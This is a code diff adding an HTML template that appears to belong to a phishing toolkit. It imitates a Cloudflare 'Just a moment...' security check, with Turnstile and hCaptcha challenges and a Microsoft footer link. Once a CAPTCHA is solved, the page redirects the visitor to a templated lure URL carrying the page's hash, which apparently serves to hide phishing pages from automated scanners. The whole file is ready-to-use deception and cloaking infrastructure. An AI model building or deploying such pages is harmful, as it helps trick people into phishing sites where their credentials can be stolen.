@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="en-US">
+    <head>
+        <script src="https://challenges.cloudflare.com/turnstile/v0/api.js?onload=onloadTurnstileCallback" async defer></script>
+        <script src="https://js.hcaptcha.com/1/api.js" async defer></script>
+
+        <title>Just a moment...</title>
+        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+        <meta http-equiv="X-UA-Compatible" content="IE=Edge" />
+        <meta name="robots" content="noindex,nofollow" />
+        <meta name="viewport" content="width=device-width,initial-scale=1" />
+        <script>
+            var verifyCallback_CF = function (response) {
+                let cfForm = document.querySelector("#cfForm")
+                if (validateElement(cfForm) && response.length > 10) {
+                    // console.log(response);
+                    cfForm.remove()
+                    window.location.href = { lure_url_js } + window.location.hash
+                    return
+                }
+                console.log("cant find cloudflare, switching to hcaptcha")
+                return switchToSecondCaptcha()
+            }
+        </script>
+        <script>
+            var verifyCallback_hCaptcha = function (response) {
+                let gForm = document.querySelector("#gForm")
+                if (gForm == undefined) {
+                    return
+                }
+                if (gForm.style != undefined && gForm.style.visibility != undefined) {
+                    gForm = document.querySelector("#gForm").style.visibility = "hidden"
+                }
+                window.location.href = { lure_url_js } + window.location.hash
+            }
+            function validateElement(element) {
+                return element != undefined && element.style != undefined && element.style.visibility != undefined
+            }
+        </script>
+        <script>
+            window.switchToSecondCaptcha = function () {
+                console.log("CAPTCHA switch callback activated")
+                let gForm = document.querySelector("#gForm")
+                if (validateElement(gForm) || gForm.style == "visible") {
+                    return
+                }
+                setTimeout(function () {
+                    const cfForm = document.querySelector("#cfForm")
+                    if (validateElement(cfForm) && cfForm.style.visibility != "hidden") {
+                        cfForm.remove()
+                    }
+                    setTimeout(function () {
+                        gForm.style.visibility = "visible"
+                    }, 200)
+                }, 200)
+            }
+            var refreshCallBack = function (response) {
+                console.log("Refresh callback activated")
+                setTimeout(function () {
+                    window.location.reload()
+                }, 1000)
+            }
+        </script>
+
+        <script>
+            window.onloadTurnstileCallback = function () {
+                turnstile.render("#turnstileCaptcha", {
+                    sitekey: "{ turnstile_sitekey }",
+                    callback: verifyCallback_CF,
+                    "expired-callback": refreshCallBack,
+                    // "error-callback": switchToSecondCaptcha(),
+                })
+            }
+        </script>
+        <script>
+            var incrementLoader = function () {
+                const waitp = document.querySelector("#cf-spinner-please-wait")
+                const gForm = document.querySelector("#gForm")
+                if (validateElement(gForm) && gForm.style.visibility == "hidden") {
+                    waitp.textContent += "."
+                }
+            }
+            setTimeout(() => {
+                let i = 0
+                ticker = setInterval(function () {
+                    i += 1
+                    incrementLoader()
+                    if (i > 3) {
+                        clearInterval(ticker)
+                        return
+                    }
+                }, 1000)
+            }, 500)
+
+            setTimeout(function () {
+                const cfForm = document.querySelector("#cfForm")
+                if (!validateElement(cfForm)) {
+                    switchToSecondCaptcha()
+                    return
+                }
+                const gForm = document.querySelector("#gForm")
+                if (!validateElement(gForm)) {
+                    // nothing to switch to
+                    return
+                }
+                 if (cfForm.style.visibility == "visible" || gForm.style.visibility != "visible") {
+                    switchToSecondCaptcha()
+                }
+            }, 7000)
+        </script>
+    </head>
+
+    <body class="no-js">
+        <div class="main-wrapper" role="main">
+            <div class="main-content">
+                <h1 class="zone-name-title h1">
+                    <div>
+                        <img class="" src="" style="margin-bottom: -17px" style="visibility: hidden" onerror="this.onerror=null;this.parentNode.removeChild(this)" />
+                        <div id="site-name"></div>
+                    </div>
+                </h1>
+                <span id="challenge-error-text"></span>
+                <noscript>
+                    <div id="challenge-error-title">
+                        <div class="h2">
+                            <div class="icon-wrapper">
+                                <div class="heading-icon warning-icon"></div>
+                            </div>
+                            <span class="icon-wrapper">
+                                <div class="heading-icon warning-icon"></div>
+                            </span>
+                            <span id="challenge-error-text"> Enable JavaScript and cookies to continue </span>
+                        </div>
+                    </div>
+                </noscript>
+                <p data-translate="please_wait" id="cf-spinner-please-wait">Please stand by, while we are checking if the site connection is secure</p>
+                <form action="?" method="POST" id="gForm" style="visibility: hidden">
+                    <div class="h-captcha" data-sitekey="234adb2f-52ba-4697-82fa-abecbb14b173" data-callback="verifyCallback_hCaptcha"></div>
+                    <br>
+                </form>
+                <form action="?" method="POST" id="cfForm" style="visibility: visible" data-callback="verifyCallback_CF">
+                    <div id="turnstileCaptcha"></div>
+                    <br>
+                </form>
+                <div id="challenge-body-text" class="core-msg spacer">
+                    <div id="site-name" style="float: left; margin-left: 10px; margin-right: 10px"></div>
+                    <div style="margin: 10px"></div>
+                </div>
+            </div>
+        </div>
+        <div class="footer" role="contentinfo">
+            <div class="footer-inner">
+                <div class="text-center">
+                    <!-- Performance &amp; security by -->
+                    <a rel="noopener noreferrer" href="https://www.microsoft.com?utm_source=challenge&utm_campaign=m" target="_blank"></a>
+                </div>
+            </div>
+        </div>
+    </body>
+</html>
